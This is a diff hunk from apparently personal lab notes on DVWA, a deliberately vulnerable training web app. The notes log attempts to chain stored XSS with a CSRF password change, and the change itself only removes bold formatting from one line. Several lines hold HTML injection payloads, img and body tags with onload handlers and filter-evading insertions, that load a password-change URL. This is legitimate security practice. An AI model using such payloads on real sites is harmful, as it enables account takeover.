@@ -48,6 +48,6 @@
     But since my HTML page can't be compliant with the referrer header, I'll have to do this from the same host.
   * I've attempted to go back to the XSS (Stored) page on the same security level and enter this into the name field with no alerts popping up:
    <img<meta>><<meta>img onload=alert(1) src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change">
-  * Instead of using the <img<meta>> tag, I did **<body<meta>><<meta>body onload=alert(1) src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change">**
+  * Instead of using the <img<meta>> tag, I did <body<meta>><<meta>body onload=alert(1) src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change">
     which seems to have worked and an alert window shows, but no requests are made to the /csrf/ location on Burp.
   * <body<meta>><<meta>body onload=alert(1)><<meta>img src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change"> makes requests to /csrf/, but it doesn't change the password.
